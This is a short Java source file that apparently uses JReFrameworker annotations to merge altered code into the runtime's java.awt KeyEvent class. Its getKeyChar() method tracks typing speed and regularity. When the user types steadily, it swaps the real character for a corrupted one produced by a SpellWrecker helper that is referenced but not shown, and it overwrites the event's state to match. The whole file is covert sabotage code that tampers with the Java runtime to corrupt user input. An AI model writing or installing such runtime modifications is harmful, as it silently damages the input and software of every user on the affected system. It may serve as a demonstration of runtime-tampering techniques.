package java.awt;

import java.awt.event.KeyEvent;

import jreframeworker.annotations.fields.DefineField;
import jreframeworker.annotations.methods.MergeMethod;

public class SpellWreckedKeyEvent extends KeyEvent {

	private static final long serialVersionUID = 1L;

	public SpellWreckedKeyEvent(Component arg0, int arg1, long arg2, int arg3, int arg4, char arg5, int arg6) {
		super(arg0, arg1, arg2, arg3, arg4, arg5, arg6);
	}

	@DefineField
	private long lastAction = System.currentTimeMillis();
	
	@DefineField
	private final SpellWrecker.Monitor monitor = new SpellWrecker.Monitor(1000, 5); // 1 second window, with 5 second history
	
	@MergeMethod
	public char getKeyChar(){
		char original = super.getKeyChar();
		monitor.observe();
		if(monitor.getAverageObservations() > 3){
			if(monitor.getHistoricalStandardDeviation() < 3.5){
				if(System.currentTimeMillis() - lastAction > 700){
					char spellwrecked = SpellWrecker.spellwreck(original);
					super.setKeyChar(spellwrecked); // just being thorough and updating the state of the object
					lastAction = System.currentTimeMillis();
					return spellwrecked;
				}
			}
		}
		return original;
	}

}
